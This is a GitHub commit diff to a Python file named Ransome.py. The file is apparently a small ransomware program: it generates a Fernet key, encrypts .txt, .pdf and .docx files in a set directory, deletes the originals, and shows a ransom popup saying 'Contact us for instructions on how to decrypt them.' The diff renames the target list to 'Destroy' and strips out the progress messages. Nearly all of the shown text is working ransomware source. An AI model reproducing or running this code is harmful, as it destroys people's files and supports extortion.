b68c2d22dd820a00ec40e37de432ad065bf330d1
Berrym-tech <71224774+Berrym-tech@users.noreply.github.com>
2024-04-30 19:10:16 -0400

    Add files via upload

--- Ransome.py
+++ Ransome.py
@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 from tkinter import messagebox
 import tkinter as tk
 
-# Generate Encryption Key and save it to a file
+# Key Generation and save it to a file
 key = Fernet.generate_key()
 with open('Ransom.key', 'wb') as filekey:
     filekey.write(key)
@@ -28,20 +28,18 @@ def show_popup(message):
 directory_path = "/home/maxwell/Desktop/Happy Files"
 
 # The Blacklisted portion helps to make sure I don't Encrypt anything that actually matters on the system. While the Allowed portion helps me see what files I am allowed to encrypt.
-blacklisted = ['.dll', '.exe', '.sys', '.ini']
-allowed = ['.txt', '.pdf', '.docx']
+Do_Not_Touch = ['.dll', '.exe', '.sys', '.ini']
+Destroy = ['.txt', '.pdf', '.docx']
 
 for root, dirs, files in os.walk(directory_path):
     for file in files:
         file_path = os.path.join(root, file)
         file_ext = os.path.splitext(file_path)[1].lower()
 
-        if file_ext in allowed and file_ext:
-            print(f"File '{file_path}' Encrypted.")
+        if file_ext in Destroy and file_ext:
             encrypt_file(file_path, key)
             time.sleep(1)
             os.remove(file_path)
-            print(f"Normal file '{file_path}' is no more.")
 
 # Ransomware Popup
 message_text = "RANSOMWARE ALERT! Your files have been encrypted. Contact us for instructions on how to decrypt them."
